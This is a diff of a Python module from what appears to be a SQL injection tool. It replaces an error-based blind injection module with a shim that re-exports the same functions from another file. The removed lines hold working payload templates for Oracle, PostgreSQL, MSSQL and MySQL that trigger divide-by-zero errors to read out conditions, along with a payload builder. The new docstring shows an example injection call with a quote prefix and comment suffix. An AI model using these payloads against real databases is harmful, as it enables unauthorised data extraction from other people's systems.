@@ -1,39 +1,28 @@
-"""Error-based blind SQL injection channel.
+"""Backward-compatible shim.
 
-Payload shape:
-    prefix = "'"
-    body   = "||(SELECT CASE WHEN (cond) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||"
-    suffix = "'--"
+The actual templates and the ErrorChannel now live in channels/error.py.
+This module re-exports them so existing imports keep working:
+
+    from . import error_based as EB
+    EB.templates_for("mysql")
+    EB.build_payload(tpl, "1=1", prefix="'", suffix="'-- ")
+    EB.all_error_dialects()
+
+Nothing else should import from here directly.
 """
 
-TEMPLATES = [
-    ("oracle_dual_tochar", "oracle",
-     "||(SELECT CASE WHEN ({c}) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||"),
+from .channels.error import (  # noqa: F401
+    ErrorChannel,
+    TEMPLATES,
+    templates_for,
+    build_payload,
+    all_error_dialects,
+)
 
-    ("oracle_dual_cast", "oracle",
-     "||(SELECT CASE WHEN ({c}) THEN CAST(1/0 AS NUMBER) ELSE NULL END FROM dual)||"),
-
-    ("pg_cast_1div0", "postgres",
-     "||(SELECT CASE WHEN ({c}) THEN CAST(1/0 AS int) ELSE 1 END)||"),
-
-    ("mssql_if_1div0", "mssql",
-     "; IF ({c}) SELECT 1/0--"),
-
-    ("mysql_1div0_sub", "mysql",
-     " AND (SELECT 1 FROM (SELECT 1) x WHERE ({c}) AND 1/0)--"),
+__all__ = [
+    "ErrorChannel",
+    "TEMPLATES",
+    "templates_for",
+    "build_payload",
+    "all_error_dialects",
 ]
-
-
-def templates_for(dialect: str) -> list[tuple[str, str]]:
-    d = dialect.lower()
-    return [(n, t) for (n, dd, t) in TEMPLATES if dd == d]
-
-
-def build_payload(template: str, condition: str,
-                  prefix: str = "", suffix: str = "") -> str:
-    body = template.format(c=condition)
-    return f"{prefix}{body}{suffix}"
-
-
-def all_error_dialects() -> list[str]:
-    return sorted({d for (_, d, _) in TEMPLATES})
